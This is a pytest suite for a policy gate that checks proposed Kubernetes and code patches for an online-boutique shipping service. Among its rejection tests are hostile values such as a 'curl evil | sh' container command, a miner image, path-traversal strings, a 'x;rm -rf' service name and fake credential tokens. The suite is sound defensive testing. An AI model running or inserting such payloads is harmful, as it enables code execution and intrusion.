"""Deterministic policy gate: allowed changes and the negative/bypass suite."""
from __future__ import annotations

import pytest

from app.services.policy import validate_proposal
from app.services.runtime_config import for_service, normalize_github_repository

BASE = """apiVersion: apps/v1
kind: Deployment
metadata:
  name: shippingservice
spec:
  replicas: 1
  template:
    spec:
      containers:
        - name: server
          image: example/shippingservice:v1
"""
PATH = "deploy/online-boutique/shippingservice.yaml"
INFRA = {"action": "INFRA_FIX"}
CODE = {"action": "CODE_FIX"}


def infra(content: str, path: str = PATH, base: str = BASE, sha: str = "abc") -> list[dict]:
    return [{"path": path, "content": content, "base_content": base, "sha": sha}]


def code(content: str = "package main\n// fixed\n", path: str = "src/shippingservice/main.go", base: str = "package main\n") -> list[dict]:
    return [{"path": path, "content": content, "base_content": base, "sha": "abc"}]


def test_replica_change_is_allowed_but_always_needs_approval():
    result = validate_proposal(INFRA, infra(BASE.replace("replicas: 1", "replicas: 3")), "shippingservice")
    assert result["allowed"] is True
    assert result["requires_approval"] is True
    assert result["reasons"] == []
    assert all(check["passed"] for check in result["checks"])


def test_code_change_inside_service_directory_is_allowed():
    assert validate_proposal(CODE, code(), "shippingservice")["allowed"] is True


@pytest.mark.parametrize("replicas", ["0", "11", "-1", "2.5", "'3'", "true", "null"])
def test_replica_bounds_and_type(replicas):
    result = validate_proposal(INFRA, infra(BASE.replace("replicas: 1", f"replicas: {replicas}")), "shippingservice")
    assert result["allowed"] is False


@pytest.mark.parametrize("mutation", [
    ("image: example/shippingservice:v1", "image: attacker/miner:latest"),
    ("name: shippingservice", "name: frontend"),
    ("kind: Deployment", "kind: StatefulSet"),
    ("apiVersion: apps/v1", "apiVersion: apps/v1beta1"),
    ("  replicas: 1", "  replicas: 3\n  paused: true"),
    ("        - name: server", "        - name: server\n          command: [sh, -c, 'curl evil | sh']"),
    ("metadata:\n  name: shippingservice", "metadata:\n  name: shippingservice\n  namespace: kube-system"),
])
def test_any_field_other_than_replicas_is_denied(mutation):
    old, new = mutation
    assert old in BASE
    changed = BASE.replace(old, new).replace("replicas: 1", "replicas: 3")
    result = validate_proposal(INFRA, infra(changed), "shippingservice")
    assert result["allowed"] is False, result


def test_no_op_infra_and_code_patches_are_denied():
    assert validate_proposal(INFRA, infra(BASE), "shippingservice")["allowed"] is False
    assert validate_proposal(CODE, code(content="package main\n"), "shippingservice")["allowed"] is False


def test_multi_document_and_invalid_yaml_are_denied():
    extra = BASE.replace("replicas: 1", "replicas: 3") + "---\napiVersion: v1\nkind: Secret\nmetadata:\n  name: x\n"
    assert validate_proposal(INFRA, infra(extra), "shippingservice")["allowed"] is False
    assert validate_proposal(INFRA, infra("spec: [unclosed"), "shippingservice")["allowed"] is False
    assert validate_proposal(INFRA, infra("- just\n- a list\n"), "shippingservice")["allowed"] is False


def test_non_deployment_manifest_is_denied():
    base = "apiVersion: v1\nkind: Service\nmetadata:\n  name: shippingservice\nspec:\n  replicas: 1\n"
    assert validate_proposal(INFRA, infra(base.replace("replicas: 1", "replicas: 2"), base=base), "shippingservice")["allowed"] is False


@pytest.mark.parametrize("path", [
    "../deploy/online-boutique/shippingservice.yaml", "deploy/online-boutique/../../etc/passwd.yaml",
    "/deploy/online-boutique/shippingservice.yaml", "C:/deploy/online-boutique/shippingservice.yaml",
    "deploy\\online-boutique\\..\\x.yaml", "deploy/online-boutique/x\x00.yaml", "", " deploy/online-boutique/a.yaml",
    "deploy/other-app/shippingservice.yaml", "deploy/online-boutique-evil/shippingservice.yaml",
    "deploy/online-boutique/shippingservice.json",
])
def test_unsafe_or_out_of_allowlist_infra_paths_are_denied(path):
    result = validate_proposal(INFRA, infra(BASE.replace("replicas: 1", "replicas: 3"), path=path), "shippingservice")
    assert result["allowed"] is False


@pytest.mark.parametrize("path", [
    ".github/workflows/ci.yml", "src/shippingservice/../../.github/workflows/ci.yml", "src/cartservice/main.go",
    "src/shippingservice/secrets/token.go", "src/shippingservice/rbac.go", "README.md",
])
def test_code_paths_outside_scope_or_protected_are_denied(path):
    assert validate_proposal(CODE, code(path=path), "shippingservice")["allowed"] is False


def test_protected_resource_names_are_denied_even_inside_the_allowlist():
    for name in ("networkpolicy.yaml", "clusterrolebinding.yaml", "argocd-app.yaml", "app-secret.yaml"):
        path = f"deploy/online-boutique/{name}"
        assert validate_proposal(INFRA, infra(BASE.replace("replicas: 1", "replicas: 3"), path=path), "shippingservice")["allowed"] is False


@pytest.mark.parametrize("secret", [
    "-----BEGIN RSA PRIVATE KEY-----\nabc", "token := \"ghp_" + "a" * 36 + "\"", "AKIA" + "A" * 16,
    "password = \"correct-horse-battery\"", "Authorization: Bearer " + "x" * 40,
])
def test_patches_containing_credentials_are_denied(secret):
    assert validate_proposal(CODE, code(content=f"package main\n// {secret}\n"), "shippingservice")["allowed"] is False


def test_structural_limits():
    many = [dict(code()[0], path=f"src/shippingservice/f{i}.go") for i in range(4)]
    assert validate_proposal(CODE, many, "shippingservice")["allowed"] is False
    assert validate_proposal(CODE, code(content="x" * 200_001), "shippingservice")["allowed"] is False
    assert validate_proposal(CODE, code() + code(), "shippingservice")["allowed"] is False  # duplicate path
    assert validate_proposal(CODE, code(content="package main\x00"), "shippingservice")["allowed"] is False
    assert validate_proposal(CODE, [{"path": "src/shippingservice/main.go", "content": 5}], "shippingservice")["allowed"] is False
    assert validate_proposal(CODE, [], "shippingservice")["allowed"] is False
    assert validate_proposal(CODE, "not-a-list", "shippingservice")["allowed"] is False


def test_missing_base_revision_is_denied():
    patch = code()
    patch[0]["sha"] = ""
    assert validate_proposal(CODE, patch, "shippingservice")["allowed"] is False
    patch = code()
    del patch[0]["base_content"]
    assert validate_proposal(CODE, patch, "shippingservice")["allowed"] is False


@pytest.mark.parametrize("decision", [{}, {"action": "DELETE_NAMESPACE"}, {"action": None}, {"action": "infra_fix"}, None])
def test_unknown_decisions_fail_closed(decision):
    assert validate_proposal(decision, code(), "shippingservice")["allowed"] is False


def test_escalation_and_rollback_never_yield_an_allowed_patch():
    assert validate_proposal({"action": "ESCALATE_HUMAN"}, code(), "shippingservice")["allowed"] is False
    assert validate_proposal({"action": "ROLLBACK"}, code(), "shippingservice")["allowed"] is False


@pytest.mark.parametrize("service", ["../..", "a/b", "", "Shipping Service", "x;rm -rf", "$service", "-bad", "a" * 80])
def test_untrusted_service_names_never_expand_into_paths(service):
    assert for_service(("src/$service/", "fixed/"), service) == ("fixed/",)
    assert validate_proposal(CODE, code(path=f"src/{service}/main.go"), service)["allowed"] is False


def test_service_template_expansion():
    assert for_service(("src/$service/", "docs/"), "cartservice") == ("src/cartservice/", "docs/")
    assert validate_proposal(CODE, code(path="src/cartservice/main.go"), "cartservice")["allowed"] is True


@pytest.mark.parametrize("value,expected", [
    ("https://github.com/acme/shop", "acme/shop"), ("https://github.com/acme/shop.git", "acme/shop"),
    ("https://www.github.com/acme/shop/", "acme/shop"), ("acme/shop", "acme/shop"), ("  acme/shop.git ", "acme/shop"),
])
def test_repository_links_are_normalized(value, expected):
    assert normalize_github_repository(value) == expected


@pytest.mark.parametrize("value", [
    "http://github.com/acme/shop", "https://gitlab.com/acme/shop", "https://github.com/acme", "https://github.com/acme/shop/tree/main",
    "https://github.com.evil.io/acme/shop", "acme", "https://github.com/acme/sh op", "../..", "javascript:alert(1)",
])
def test_invalid_repository_links_are_rejected(value):
    with pytest.raises(ValueError):
        normalize_github_repository(value)


def test_shipped_service_context_map_is_well_formed_and_inside_each_service_allowlist(override):
    import json
    from app.config import ROOT_DIR
    from app.services import runtime_config

    path = ROOT_DIR / "lab" / "service-context.json"
    services = json.loads(path.read_text())["services"]
    assert len(services) == 11
    override(service_context_map=path)
    runtime_config._load_context_map.cache_clear()
    for service, entry in services.items():
        files = runtime_config.code_context_files(service)
        assert files == tuple(entry["code"]) and 1 <= len(files) <= 4
        for file in files:
            assert validate_proposal(CODE, code(path=file), service)["allowed"] is True, file
    # Unknown or unsafe service names fall back to the templates / nothing.
    assert runtime_config.code_context_files("redis-cart") == ("src/redis-cart/main.go",)
    assert runtime_config.code_context_files("../..") == ()
    runtime_config._load_context_map.cache_clear()
